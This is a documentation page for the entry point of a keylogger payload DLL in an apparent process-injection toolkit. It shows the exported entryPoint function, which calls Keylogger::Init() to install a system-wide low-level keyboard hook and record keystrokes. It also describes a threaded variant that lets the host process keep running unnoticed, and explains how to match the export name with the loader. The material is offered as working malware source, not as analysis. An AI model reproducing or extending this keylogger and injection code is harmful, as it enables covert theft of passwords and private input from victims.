# main.cpp

## Overview
`main.cpp` is the payload DLL entry point for the **Keylogger** module. Its structure is identical to [`ExampleDLL/main.cpp`](../ExampleDLL/main.cpp.md) — same globals, same `DllMain`, same two-export pattern (`firstEntry` / `entryPoint`). The only difference is what `entryPoint` does: instead of a message-box loop it calls `Keylogger::Init()`, starting the keystroke capture.

For a full explanation of the shared mechanics (`dllParam`, `wasDllMainCalled`, `DllMain`, `firstEntry`, the role of each export) refer to **[ExampleDLL/main.cpp.md](../ExampleDLL/main.cpp.md)**.

---

## Differences from ExampleDLL/main.cpp

| | ExampleDLL | Keylogger |
| :--- | :--- | :--- |
| Export name (LoadMe) | `fristEntry` | `firstEntry` (typo fixed) |
| `entryPoint` behaviour | Infinite `MessageBoxA` loop | Calls `Keylogger::Init()` — blocks in message loop, logs keystrokes |
| Injection namespace | `DllTools::AutoInject` | `InjectTools::AutoInject` |
| Shared header | `dllTools.h` | `InjectTools.h` / `Includes.h` |

---

## `entryPoint` — what changes

```cpp
extern "C" __declspec(dllexport) void entryPoint() {
    if (wasDllMainCalled) {
        Keylogger::Init();   // installs WH_KEYBOARD_LL hook, blocks in GetMessage loop
    } else {
        MessageBoxA(0, "DllMain wasn't called!", "Keylogger", MB_ICONINFORMATION | MB_OK);
    }
}
```

`Keylogger::Init()` installs the system-wide hook and then **blocks indefinitely** in a `GetMessage` loop — the loop is required to keep the hook alive. This means `entryPoint` never returns while the keylogger is running.

> **Threading note.** The commented-out `KeyloggerThread` / `CreateThread` block in the source shows the non-blocking alternative: spawning `Keylogger::Init()` on a dedicated thread so `entryPoint` returns immediately and the host process continues normally. See [`Keylogger.cpp.md`](Keylogger.cpp.md#modifying) for the complete pattern.

---

## Export name fix

`firstEntry` (with the correct spelling) replaces the `fristEntry` typo present in ExampleDLL. Update `runningFunctionName` in `loadder.cpp` to match:
```cpp
const LPCWSTR runningFunctionName = L"firstEntry";
```
Both the DLL and LoadMe must be recompiled together after this change.